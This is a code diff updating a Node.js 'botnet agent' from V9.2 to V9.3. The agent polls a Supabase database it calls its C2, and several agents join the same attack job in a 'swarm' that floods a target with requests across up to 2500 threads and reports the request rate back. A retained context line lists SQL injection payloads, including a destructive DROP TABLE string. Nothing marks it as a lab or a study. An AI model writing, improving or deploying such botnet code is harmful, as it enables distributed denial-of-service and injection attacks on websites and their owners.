@@ -1,8 +1,8 @@
 /**
- * STRESSFORGE BOTNET AGENT V9.2 (STABILITY UPDATE)
- * - Fix: Database Write Reliability
- * - Fix: Latency Calculation Logic
- * - Host: Render/Railway Free Tier Optimized
+ * STRESSFORGE BOTNET AGENT V9.3 (SWARM INTELLIGENCE)
+ * - Feature: Self-Healing DB Writes (Fallback Mode)
+ * - Feature: True Swarm (Joins RUNNING jobs)
+ * - Safety: Memory Governor (Max 2500 threads)
  */
 const https = require('https');
 const http = require('http');
@@ -32,7 +32,7 @@ const SQL_PAYLOADS = ["' OR 1=1 --", "UNION SELECT 1, SLEEP(10) --", "'; DROP TA
 
 // --- KEEPALIVE SERVER ---
 const PORT = process.env.PORT || 3000;
-http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent V9.2 ACTIVE'); })
+http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent V9.3 ACTIVE'); })
     .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
 
 // --- HELPER: NATIVE SUPABASE ---
@@ -55,7 +55,13 @@ const supabaseRequest = (method, pathStr, body = null) => {
             const req = https.request(options, (res) => {
                 let data = '';
                 res.on('data', chunk => data += chunk);
-                res.on('end', () => { try { resolve(data ? JSON.parse(data) : null); } catch(e) { resolve(null); } });
+                res.on('end', () => { 
+                    if (res.statusCode >= 400) {
+                        reject(new Error(`API Error ${res.statusCode}: ${data}`));
+                    } else {
+                        try { resolve(data ? JSON.parse(data) : null); } catch(e) { resolve(null); } 
+                    }
+                });
             });
             req.on('error', (e) => reject(e));
             if (body) req.write(JSON.stringify(body));
@@ -64,7 +70,7 @@ const supabaseRequest = (method, pathStr, body = null) => {
     });
 };
 
-console.log('\x1b[35m[AGENT] Initialized V9.2. Polling C2...\x1b[0m');
+console.log('\x1b[35m[AGENT] Initialized V9.3 (Swarm). Polling C2...\x1b[0m');
 
 let activeJob = null;
 let activeLoop = null;
@@ -230,6 +236,7 @@ const startAttack = (job) => {
         const used = process.memoryUsage().heapUsed / 1024 / 1024;
         if (used > 400 && global.gc) global.gc();
 
+        // SELF-HEALING DB WRITE
         try {
              await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { 
                  current_rps: rps,
@@ -239,7 +246,11 @@ const startAttack = (job) => {
                  max_latency: jobMaxLatency 
              });
         } catch(e) { 
-            console.log('[ERROR] DB Write Failed. Check Schema.');
+            console.log(`[DB ERROR] ${e.message}`);
+            // Fallback: If full stats fail (schema mismatch), try sending just RPS
+            try {
+                await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { current_rps: rps });
+            } catch(e2) { }
         }
 
         if (duration > 0 && elapsed >= duration) {
@@ -256,10 +267,14 @@ const startAttack = (job) => {
 setInterval(async () => {
     if (activeJob) return;
     try {
-        const jobs = await supabaseRequest('GET', '/jobs?status=eq.PENDING&limit=1');
+        // True Swarm: Check for PENDING or RUNNING jobs
+        const jobs = await supabaseRequest('GET', '/jobs?status=in.(PENDING,RUNNING)&limit=1');
         if (jobs && jobs.length > 0) {
             const job = jobs[0];
-            await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'RUNNING' });
+            // Only update status to RUNNING if it's PENDING
+            if (job.status === 'PENDING') {
+                await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'RUNNING' });
+            }
             startAttack(job);
         }
     } catch (e) { }
